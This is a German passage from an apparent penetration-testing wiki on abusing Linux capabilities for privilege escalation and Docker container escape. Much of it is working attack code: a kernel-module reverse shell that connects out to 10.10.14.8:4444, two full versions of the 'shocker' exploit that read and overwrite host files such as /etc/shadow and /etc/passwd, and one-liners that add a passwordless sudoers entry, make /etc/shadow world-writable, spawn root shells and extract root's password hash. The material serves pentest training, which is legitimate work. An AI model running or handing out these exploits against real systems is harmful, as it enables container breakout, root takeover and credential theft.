**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** ermöglicht einem Prozess, Kernel-Module zu **load**en und zu **unload**en (Systemaufrufe **`init_module(2)`, `finit_module(2)` und `delete_module(2)`**), und gewährt damit direkten Zugriff auf die Kernoperationen des Kernels. Diese Capability birgt erhebliche Sicherheitsrisiken, da das Laden eines Moduls das Verhalten des Kernels verändern und Isolationsgrenzen umgehen kann.<sup>[[6]](#references)[[14]](#references)</sup>
**Dies ermöglicht das Einfügen oder Entfernen von Modulen in dem für den Prozess sichtbaren Kernel; in einem Container hängt es von der Isolationskonfiguration ab, ob dies den Host-Kernel betrifft**.<sup>[[14]](#references)</sup>

**Beispiel mit binary**

Im folgenden Beispiel verfügt das **`python`**-binary über diese Capability.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
Standardmäßig prüft der Befehl **`modprobe`** im Verzeichnis **`/lib/modules/$(uname -r)`** nach Abhängigkeitslisten und Map-Dateien.\
Um dies auszunutzen, erstellen wir einen gefälschten **lib/modules**-Ordner:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
Kompiliere dann das **Kernelmodul**, das du in den 2 unten stehenden Beispielen findest, und kopiere es in diesen Ordner:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
Führen Sie schließlich den erforderlichen Python-Code aus, um dieses Kernelmodul zu laden:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**Beispiel 2 mit Binary**

Im folgenden Beispiel verfügt das Binary **`kmod`** über diese Capability.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
Das bedeutet, dass es möglich ist, den Befehl **`insmod`** zu verwenden, um ein Kernelmodul einzufügen. Folge dem untenstehenden Beispiel, um eine **reverse shell** unter Ausnutzung dieses Privilegs zu erhalten.

**Beispiel mit environment (Docker breakout)**

Du kannst die aktivierten Capabilities innerhalb des Docker-Containers mit folgendem Befehl überprüfen:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Im vorherigen Output ist zu sehen, dass die Capability **SYS_MODULE** aktiviert ist.<sup>[[14]](#references)</sup>

**Erstelle** das **Kernelmodul**, das eine Reverse Shell ausführen wird, sowie das **Makefile**, um es zu **kompilieren**:
```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
> [!WARNING]
> Das Leerzeichen vor jedem make-Befehl in der Makefile **muss ein Tabulator und dürfen keine Leerzeichen sein**!

Führe `make` aus, um es zu kompilieren.
```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
Starte schließlich `nc` innerhalb einer Shell und **lade das Modul** aus einer anderen, dann fängst du die Shell im nc-Prozess ab:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**Der Code dieser Technik wurde aus dem Labor „Abusing SYS_MODULE Capability“ von** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com) **kopiert.**<sup>[[1]](#references)</sup>

Ein weiteres Beispiel für diese Technik ist unter [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host) zu finden.

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) ermöglicht einem Prozess, **Berechtigungen zum Lesen von Dateien sowie zum Lesen und Ausführen von Verzeichnissen zu umgehen**. Der Hauptzweck besteht in der Dateisuche oder dem Lesen von Dateien. Es ermöglicht einem Prozess jedoch auch, die Funktion `open_by_handle_at(2)` zu verwenden, die auf jede Datei zugreifen kann, einschließlich solcher außerhalb des Mount-Namespace des Prozesses. Der in `open_by_handle_at(2)` verwendete Handle sollte eigentlich eine nicht transparente Kennung sein, die über `name_to_handle_at(2)` abgerufen wird, kann jedoch sensible Informationen wie Inode-Nummern enthalten, die für Manipulationen anfällig sind. Das Ausnutzungspotenzial dieser Capability, insbesondere im Kontext von Docker-Containern, wurde von Sebastian Krahmer mit dem Shocker-Exploit demonstriert, wie [hier](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) analysiert wird.<sup>[[12]](#references)[[13]](#references)</sup>
**Das bedeutet, dass du Prüfungen der Dateileseberechtigungen sowie Prüfungen der Lese-/Ausführungsberechtigungen von Verzeichnissen umgehen kannst**.<sup>[[14]](#references)</sup>

**Beispiel mit Binary**

Das Binary kann Dateien lesen, die in seinen Namespaces zugänglich sind. Wenn also eine Datei wie `tar` über diese Capability verfügt, kann es die Shadow-Datei lesen:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Beispiel mit binary2**

In diesem Fall nehmen wir an, dass das **`python`**-Binary über diese Capability verfügt. Um die Root-Dateien aufzulisten, könntest du Folgendes ausführen:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
Und um eine Datei zu lesen, könntest du Folgendes tun:
```python
print(open("/etc/shadow", "r").read())
```
**Beispiel in der Umgebung (Docker breakout)**

Du kannst die aktivierten Capabilities innerhalb des Docker-Containers mit `capsh --print` überprüfen.<sup>[[14]](#references)[[26]](#references)</sup>
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
In der vorherigen Ausgabe ist zu sehen, dass die Fähigkeit **DAC_READ_SEARCH** aktiviert ist. Sie umgeht DAC-Lese-/Suchprüfungen und erlaubt `open_by_handle_at(2)`; sie ist selbst keine Prozess-Debugging-Fähigkeit.<sup>[[14]](#references)</sup>

Wie der folgende Exploit funktioniert, erfahren Sie unter [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3). Kurz gesagt erlaubt **CAP_DAC_READ_SEARCH**, das Dateisystem ohne Berechtigungsprüfungen zu durchlaufen, und ermöglicht `open_by_handle_at(2)`; dadurch können Dateien offengelegt werden, die von anderen Prozessen geöffnet wurden, wenn die relevanten Namespaces und Mounts erreichbar sind.<sup>[[13]](#references)[[14]](#references)</sup>

Der ursprüngliche Exploit, der diese Berechtigungen missbraucht, um Dateien vom Host zu lesen, ist hier zu finden: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c); im Folgenden ist eine **modifizierte Version zu sehen, bei der die zu lesende Datei als erstes Argument übergeben und das Ergebnis in eine Datei geschrieben werden kann**.<sup>[[12]](#references)</sup>
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
> [!WARNING]
> Der exploit muss einen Pointer auf etwas finden, das auf dem Host gemountet ist. Der ursprüngliche exploit verwendete die Datei /.dockerinit, und diese modifizierte Version verwendet /etc/hostname. Wenn der exploit nicht funktioniert, musst du möglicherweise eine andere Datei festlegen. Um eine Datei zu finden, die auf dem Host gemountet ist, führe einfach den mount command aus:

![CAP SYS MODULE - CAP DAC READ SEARCH: Der exploit muss einen Pointer auf etwas finden, das auf dem Host gemountet ist. Der ursprüngliche exploit verwendete die Datei /.dockerinit, und diese modifizierte Version verwendet...](<../../images/image (407) (1).png>)

**Der Code dieser Technik wurde aus dem Labor „Abusing DAC_READ_SEARCH Capability“ von** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com) **kopiert.**<sup>[[1]](#references)</sup>


## CAP_DAC_OVERRIDE

**Diese Capability umgeht die Prüfungen für Datei-Lese-, Schreib- und Ausführungsberechtigungen.**<sup>[[14]](#references)</sup>

Suche nach Dateien, die durch die Mitgliedschaft in einer privilegierten Gruppe les- oder schreibbar werden; die nützlichen Ziele hängen vom Eigentümer und den Mode-Bits des Ziels ab.<sup>[[14]](#references)</sup>

**Beispiel mit Binary**

In diesem Beispiel verfügt vim über diese Capability, sodass du jede Datei wie _passwd_, _sudoers_ oder _shadow_ ändern kannst:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Beispiel mit binary 2**

In diesem Beispiel verfügt das **`python`** binary über diese Capability. Du könntest python verwenden, um jede Datei zu überschreiben:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**Beispiel mit environment + CAP_DAC_READ_SEARCH (Docker breakout)**

Bestätige `CAP_DAC_OVERRIDE` mit `capsh --print`, wie im vorherigen Beispiel für die `CAP_DAC_READ_SEARCH`-Umgebung gezeigt.<sup>[[14]](#references)[[26]](#references)</sup>

Lies zunächst den vorherigen Abschnitt, der die [**DAC_READ_SEARCH capability missbraucht, um beliebige Dateien**](linux-capabilities.md#cap_dac_read_search) des Hosts zu lesen, und **kompiliere** den Exploit.\
Dann **kompiliere die folgende Version des shocker-Exploits**, mit der du **beliebige Dateien** innerhalb des Dateisystems des Hosts **schreiben** kannst:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Um aus dem Docker-Container **zu entkommen**, könntest du die Dateien `/etc/shadow` und `/etc/passwd` vom Host **herunterladen**, ihnen einen **neuen Benutzer hinzufügen** und sie mit **`shocker_write`** überschreiben. Anschließend kannst du über **ssh** **zugreifen**.

**Der Code dieser Technik wurde aus dem Labor „Abusing DAC_OVERRIDE Capability“ von** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com) kopiert.<sup>[[1]](#references)</sup>

## CAP_CHOWN

**Diese Capability ermöglicht es einem Prozess, den Besitz von Dateien zu ändern**.<sup>[[14]](#references)</sup>

**Beispiel mit einer Binary**

Nehmen wir an, die **`python`**-Binary verfügt über diese Capability. Du kannst den Besitzer einer Datei wie **`shadow`** ändern und anschließend den daraus resultierenden Zugriff nutzen, um sie zu bearbeiten, sofern andere Berechtigungen dies erlauben:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
Oder mit der **`ruby`**-Binary, die über diese Capability verfügt:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP_FOWNER

**Diese Capability umgeht bei vielen Dateioperationen die Eigentumsprüfungen, einschließlich der Änderung von Berechtigungen**.<sup>[[14]](#references)</sup>

**Beispiel mit Binary**

Wenn Python über diese Capability verfügt, kannst du die Berechtigungen der Shadow-Datei ändern, **das Root-Passwort ändern** und deine Privilegien eskalieren:
```bash
python -c 'import os; os.chmod("/etc/shadow", 0o666)'
```
### CAP_SETUID

**Diese Capability ermöglicht es einem Prozess, seine effektive Benutzer-ID zu ändern, vorbehaltlich der vom Kernel durchgesetzten Regeln für Credentials und Capabilities**.<sup>[[14]](#references)</sup>

**Beispiel mit Binary**

Wenn python über diese **Capability** verfügt, kannst du sie sehr einfach ausnutzen, um die Privilegien auf root zu eskalieren:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**Eine weitere Möglichkeit:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP_SETGID

**Diese Capability ermöglicht es einem Prozess, seine effektive Gruppen-ID zu ändern, vorbehaltlich der vom Kernel durchgesetzten Regeln für Anmeldeinformationen und Capabilities**.<sup>[[14]](#references)</sup>

Es gibt viele Dateien, die du **überschreiben kannst, um deine Rechte zu erweitern;** [**hier kannst du dir Ideen holen**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Beispiel mit Binary**

In diesem Fall solltest du nach interessanten Dateien suchen, die eine Gruppe lesen kann, da du als jede Gruppe auftreten kannst:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
Sobald du eine Datei gefunden hast, die du zur Privilege Escalation missbrauchen kannst (durch Lesen oder Schreiben), kannst du mit Folgendem **eine Shell unter der Identität der interessanten Gruppe erhalten**:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
In diesem Fall wurde die Gruppe shadow imitiert, sodass du die Datei `/etc/shadow` lesen kannst:
```bash
cat /etc/shadow
```
### Kombinierte Kette: CAP_SETGID + CAP_CHOWN

Wenn beide Capabilities im selben Helper verfügbar sind, ist eine praktische Kette:

1. EGID auf `shadow` (oder eine andere privilegierte Gruppe) wechseln.
2. Mit `chown` `/etc/shadow` so ändern, dass die eigene UID gesetzt wird, während die Gruppe `shadow` beibehalten wird.
3. Einen Ziel-Hash lesen und crack/pivot durchführen.
```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```
Dadurch ist kein vollständiger direkter Zugriff auf **root** erforderlich, und diese Methode reicht häufig aus, um über die Wiederverwendung von Zugangsdaten zu pivotieren.

Wenn **docker** installiert ist, kannst du die **docker group** **imitieren** und sie missbrauchen, um mit dem [**docker socket** zu kommunizieren und die Berechtigungen zu erhöhen](#writable-docker-socket).

## CAP_SETFCAP

**Diese Capability ermöglicht es einem Prozess, File Capabilities zu setzen**.<sup>[[14]](#references)</sup>

**Beispiel mit einer Binary**

Wenn Python über diese **Capability** verfügt, kannst du sie sehr einfach missbrauchen, um die Berechtigungen auf **root** zu erhöhen:
```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```
> [!WARNING]
> Ein neu geschriebener Capability-Satz für eine Datei ersetzt den vorherigen Satz; wird der Helper anschließend nur mit den neuen Capabilities ausgeführt, verfügt er möglicherweise nicht mehr über `CAP_SETFCAP`, um eine andere Datei zu aktualisieren.<sup>[[14]](#references)[[25]](#references)</sup>

Sobald du über die [SETUID capability](linux-capabilities.md#cap_setuid) verfügst, kannst du zu deren Abschnitt wechseln, um zu sehen, wie du deine Privilegien eskalieren kannst.

**Beispiel mit Umgebung (Docker breakout)**

Dockers dokumentierter standardmäßiger Capability-Satz umfasst **CAP_SETFCAP**, der tatsächliche Satz hängt jedoch von der Runtime-Konfiguration ab.<sup>[[19]](#references)</sup>
Du kannst die Capabilities des Prozesses mit folgendem Befehl überprüfen:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
Diese Capability ermöglicht das Schreiben von File Capabilities, gewährt dem aktuellen Prozess jedoch nicht automatisch diese Capabilities und umgeht auch nicht die beim Ausführen der Datei geltenden Datei-, Bounding-Set- und Namespace-Regeln.<sup>[[14]](#references)</sup>
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
Die zulässigen Capabilities der Datei werden durch die Capability-Bounding-Set des Prozesses begrenzt, und das Effective-Bit der Datei steuert, ob die zulässige Capability-Menge der Datei in die Effective-Menge des Prozesses übernommen wird. Deshalb macht das Hinzufügen von Capabilities zu einer Datei nicht automatisch jede angeforderte Capability zur Ausführungszeit nutzbar.<sup>[[14]](#references)</sup>

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) ermöglicht eine Reihe sensibler Operationen, darunter den Zugriff auf `/dev/mem`, `/dev/kmem` oder `/proc/kcore`, das Ändern von `mmap_min_addr`, den Zugriff auf die Systemaufrufe `ioperm(2)` und `iopl(2)` sowie verschiedene Festplattenbefehle. Auch der `FIBMAP ioctl(2)` wird durch diese Capability aktiviert, was in der [Vergangenheit](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html) zu Problemen geführt hat. Laut der Manpage ermöglicht dies dem Inhaber außerdem, eine Reihe gerätespezifischer Operationen auf anderen Geräten auszuführen.<sup>[[14]](#references)</sup>

Dies kann für **privilege escalation** und **Docker breakout** nützlich sein.<sup>[[14]](#references)</sup>

## CAP_KILL

**Diese Capability umgeht Berechtigungsprüfungen für das Senden von Signalen an Prozesse in den vom Kernel definierten Fällen.**<sup>[[14]](#references)</sup>

**Beispiel mit Binary**

Nehmen wir an, das **`python`**-Binary verfügt über diese Capability. Wenn du außerdem eine Service- oder Socket-Konfigurationsdatei (oder eine andere Konfigurationsdatei, die zu einem Service gehört) **ändern könntest**, könntest du darin eine Hintertür einbauen, anschließend den zu diesem Service gehörenden Prozess beenden und auf die Ausführung der neuen Konfigurationsdatei mit deiner Hintertür warten.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privesc with kill**

Wenn du über **kill capabilities** verfügst und ein **node program running as root** (oder als ein anderer Benutzer) vorhanden ist, könntest du ihm wahrscheinlich das **signal SIGUSR1** **senden**, damit es den **node debugger öffnet**, mit dem du dich verbinden kannst.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**Diese Capability erlaubt das Binden an Internet-Ports unterhalb von 1024.** Sie gewährt nicht direkt eine umfassendere Privilege Escalation.<sup>[[14]](#references)</sup>

**Beispiel mit einer Binary**

Wenn **`python`** über diese Capability verfügt, kann es an jedem Port lauschen und sich sogar von diesem aus mit jedem anderen Port verbinden (einige Services erfordern Verbindungen von Ports mit bestimmten Privileges).

{{#tabs}}
{{#tab name="Listen"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{{#endtab}}

{{#tab name="Connect"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) erlaubt Prozessen, **RAW- und PACKET-Sockets zu erstellen**, wodurch sie beliebige Netzwerkpakete erzeugen und senden können. Dies kann in containerisierten Umgebungen zu Sicherheitsrisiken führen, etwa durch Packet Spoofing, Traffic Injection und das Umgehen von Netzwerkzugriffskontrollen. Angreifer könnten dies ausnutzen, um das Container-Routing zu beeinflussen oder die Netzwerksicherheit des Hosts zu kompromittieren, insbesondere ohne ausreichenden Firewall-Schutz. Zusätzlich unterstützt **CAP_NET_RAW** Vorgänge wie Ping über RAW-ICMP-Anfragen.<sup>[[14]](#references)</sup>

**Dies kann die Paketerfassung über eine geeignete Socket-Schnittstelle ermöglichen.** Es gewährt nicht direkt weitergehende Privilege Escalation.<sup>[[14]](#references)</sup>

**Beispiel mit einer Binärdatei**

Wenn die Binärdatei **`tcpdump`** über diese Capability verfügt, kannst du sie zur Erfassung von Netzwerkinformationen verwenden.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
